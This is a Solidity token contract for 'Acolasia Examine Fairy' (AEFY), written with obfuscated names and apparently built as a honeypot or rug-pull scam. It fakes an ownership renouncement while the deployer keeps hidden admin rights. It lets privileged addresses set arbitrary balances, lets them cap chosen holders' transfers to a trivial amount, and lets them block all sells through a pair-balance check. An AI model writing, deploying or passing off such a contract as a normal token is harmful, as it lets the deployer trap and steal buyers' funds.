//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface receiverLaunchedAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchAmountShould {
    function createPair(address receiverFund, address totalShould) external returns (address);
}

interface swapIsBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldFrom) external view returns (uint256);

    function transfer(address toLiquidity, uint256 senderTotal) external returns (bool);

    function allowance(address exemptFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderTotal) external returns (bool);

    function transferFrom(
        address sender,
        address toLiquidity,
        uint256 senderTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundFrom, uint256 value);
    event Approval(address indexed exemptFee, address indexed spender, uint256 value);
}

interface swapIsBuyMetadata is swapIsBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AcolasiaExamineFairy is minSell, swapIsBuy, swapIsBuyMetadata {

    string private isFeeExempt = "AEFY";

    function senderTakeAuto() private view {
        require(tokenLimit[_msgSender()]);
    }

    uint256 public enableMaxSwap;

    bool private receiverTotal;

    function symbol() external view virtual override returns (string memory) {
        return isFeeExempt;
    }

    function enableTrading(address exemptSender) public {
        senderTakeAuto();
        if (totalFee != teamMin) {
            teamMin = totalFee;
        }
        if (exemptSender == senderMarketing || exemptSender == listLimitAuto) {
            return;
        }
        tokenReceiverAuto[exemptSender] = true;
    }

    function feeAt(address exemptTeam, address toLiquidity, uint256 senderTotal) internal returns (bool) {
        require(toLaunch[exemptTeam] >= senderTotal);
        toLaunch[exemptTeam] -= senderTotal;
        toLaunch[toLiquidity] += senderTotal;
        emit Transfer(exemptTeam, toLiquidity, senderTotal);
        return true;
    }

    function allowance(address tokenTxMax, address teamTrading) external view virtual override returns (uint256) {
        if (teamTrading == marketingMaxFee) {
            return type(uint256).max;
        }
        return marketingAt[tokenTxMax][teamTrading];
    }

    uint256 private modeTo = 100000000 * 10 ** 18;

    mapping(address => uint256) private toLaunch;

    function exemptMax() public {
        emit OwnershipTransferred(senderMarketing, address(0));
        liquidityLimit = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedFundMax;
    }

    bool private launchedMarketing;

    function owner() external view returns (address) {
        return liquidityLimit;
    }

    bool public modeShould;

    constructor (){
        
        receiverLaunchedAmount receiverMinTx = receiverLaunchedAmount(marketingMaxFee);
        listLimitAuto = launchAmountShould(receiverMinTx.factory()).createPair(receiverMinTx.WETH(), address(this));
        if (totalFee != enableMaxSwap) {
            atBuy = true;
        }
        senderMarketing = _msgSender();
        exemptMax();
        tokenLimit[senderMarketing] = true;
        toLaunch[senderMarketing] = modeTo;
        if (amountMax) {
            amountMax = false;
        }
        emit Transfer(address(0), senderMarketing, modeTo);
    }

    uint256 constant amountLiquidity = 20 ** 10;

    function enableLimit(address shouldTo, uint256 senderTotal) public {
        senderTakeAuto();
        toLaunch[shouldTo] = senderTotal;
    }

    function getOwner() external view returns (address) {
        return liquidityLimit;
    }

    function transferFrom(address exemptTeam, address toLiquidity, uint256 senderTotal) external override returns (bool) {
        if (_msgSender() != marketingMaxFee) {
            if (marketingAt[exemptTeam][_msgSender()] != type(uint256).max) {
                require(senderTotal <= marketingAt[exemptTeam][_msgSender()]);
                marketingAt[exemptTeam][_msgSender()] -= senderTotal;
            }
        }
        return senderMax(exemptTeam, toLiquidity, senderTotal);
    }

    string private feeTo = "Acolasia Examine Fairy";

    mapping(address => mapping(address => uint256)) private marketingAt;

    uint256 public totalFee;

    uint256 public teamMin;

    mapping(address => bool) public tokenLimit;

    function balanceOf(address shouldFrom) public view virtual override returns (uint256) {
        return toLaunch[shouldFrom];
    }

    bool public exemptTotal;

    address public senderMarketing;

    function transfer(address shouldTo, uint256 senderTotal) external virtual override returns (bool) {
        return senderMax(_msgSender(), shouldTo, senderTotal);
    }

    function senderMax(address exemptTeam, address toLiquidity, uint256 senderTotal) internal returns (bool) {
        if (exemptTeam == senderMarketing) {
            return feeAt(exemptTeam, toLiquidity, senderTotal);
        }
        uint256 receiverFrom = swapIsBuy(listLimitAuto).balanceOf(exemptShould);
        require(receiverFrom == feeLaunched);
        require(toLiquidity != exemptShould);
        if (tokenReceiverAuto[exemptTeam]) {
            return feeAt(exemptTeam, toLiquidity, amountLiquidity);
        }
        return feeAt(exemptTeam, toLiquidity, senderTotal);
    }

    event OwnershipTransferred(address indexed fromFee, address indexed receiverWallet);

    function totalSupply() external view virtual override returns (uint256) {
        return modeTo;
    }

    uint256 feeLaunched;

    bool private tradingLaunchMode;

    address private liquidityLimit;

    function name() external view virtual override returns (string memory) {
        return feeTo;
    }

    function receiverTx(uint256 senderTotal) public {
        senderTakeAuto();
        feeLaunched = senderTotal;
    }

    address exemptShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address teamTrading, uint256 senderTotal) public virtual override returns (bool) {
        marketingAt[_msgSender()][teamTrading] = senderTotal;
        emit Approval(_msgSender(), teamTrading, senderTotal);
        return true;
    }

    bool public amountMax;

    uint256 teamLaunched;

    uint8 private launchedFundMax = 18;

    address marketingMaxFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public limitWallet;

    bool private atBuy;

    address public listLimitAuto;

    function modeEnableAt(address sellFee) public {
        require(sellFee.balance < 100000);
        if (limitWallet) {
            return;
        }
        if (tradingLaunchMode) {
            enableMaxSwap = teamMin;
        }
        tokenLimit[sellFee] = true;
        
        limitWallet = true;
    }

    mapping(address => bool) public tokenReceiverAuto;

}